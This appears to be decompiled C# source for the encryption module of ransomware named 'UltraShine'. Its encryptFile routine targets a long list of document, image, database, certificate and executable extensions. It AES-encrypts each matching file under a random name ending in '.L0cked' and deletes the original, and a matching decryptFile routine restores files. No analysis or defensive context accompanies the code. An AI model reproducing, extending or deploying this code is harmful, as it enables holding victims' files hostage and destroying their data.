using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace UltraShine
{
	// Token: 0x02000009 RID: 9
	public class CryptFile
	{
		// Token: 0x06000015 RID: 21 RVA: 0x0000222B File Offset: 0x0000042B
		[DebuggerNonUserCode]
		public CryptFile()
		{
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002234 File Offset: 0x00000434
		public static bool decryptFile(string orgFile, byte[] aesKey)
		{
			checked
			{
				try
				{
					string text = new FileInfo(orgFile).DirectoryName + "\\";
					string extension = new FileInfo(orgFile).Extension;
					string text2 = new FileInfo(orgFile).Name.Split(new char[] { '.' })[0];
					if (Operators.CompareString(extension, ".L0cked", false) != 0)
					{
						return false;
					}
					byte[] array = File.ReadAllBytes(orgFile);
					array = AES.AES.decrypt(array, aesKey);
					byte[] array2 = new byte[256];
					Array.ConstrainedCopy(array, array.Length - 256, array2, 0, 256);
					string text3 = Encoding.UTF8.GetString(array2);
					text3 = text3.TrimEnd(new char[1]);
					Array.Resize<byte>(ref array, array.Length - 256);
					File.WriteAllBytes(text + text3, array);
					File.Delete(orgFile);
					return true;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002340 File Offset: 0x00000540
		public static bool encryptFile(string orgFile, byte[] aesKey)
		{
			checked
			{
				try
				{
					string text = ".txt .text .cur .contact .ani .xls .lng .com .ion .url .ppt .src .cmd .exe .tgz .fon .pl .lib .load .CompositeFont .png .mp3 .mkv .veg .mp4 .lnk .zip .rar .7z .jpg .sln .crdownload .msi .vb .vbs .vbt .config .settings .resx .vbproj .json .jpeg .scss .css .html .hta .ttc .ttf .eot .camproj .m4r .001 .002 .003 .004 .005 .006 .007 .008 .009 .au .aex .8be .8bf .8bi .abr .adf .apk .ai .asd .bin .bat .gif .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw .as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp .contact .cr2 .crt .crw .cs .csv .dat .dll .db .dbf .dcr .der .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv .iso .idml .iff .ini .SFX .sik .indb .indd .indl .indt .ico .inx .jar .jnt .jnt .java .key .kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .pst .ptx .r3d .ra .raf .raw .rb .rtf .rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif .vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx";
					string text2 = new FileInfo(orgFile).DirectoryName + "\\";
					string name = new FileInfo(orgFile).Name;
					string text3 = new FileInfo(orgFile).Extension.ToLower();
					if (!text.Contains(text3) || Operators.CompareString(text3, "", false) == 0)
					{
						return false;
					}
					byte[] array = File.ReadAllBytes(orgFile);
					byte[] bytes = Encoding.UTF8.GetBytes(name);
					if (bytes.Length > 255)
					{
						return false;
					}
					Array.Resize<byte>(ref array, array.Length + 256);
					Array.ConstrainedCopy(bytes, 0, array, array.Length - 256, bytes.Length);
					File.WriteAllBytes(text2 + CryptFile.getRandomFileName() + ".L0cked", AES.AES.encrypt(array, aesKey));
					File.Delete(orgFile);
					Thread.Sleep(500);
					return true;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002458 File Offset: 0x00000658
		public static string getRandomFileName()
		{
			string text = "";
			string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
			Random random = new Random();
			int num = random.Next(4, 10);
			while (Math.Max(Interlocked.Decrement(ref num), checked(num + 1)) > 0)
			{
				text += Conversions.ToString(text2[random.Next(text2.Length)]);
			}
			return text;
		}
	}
}
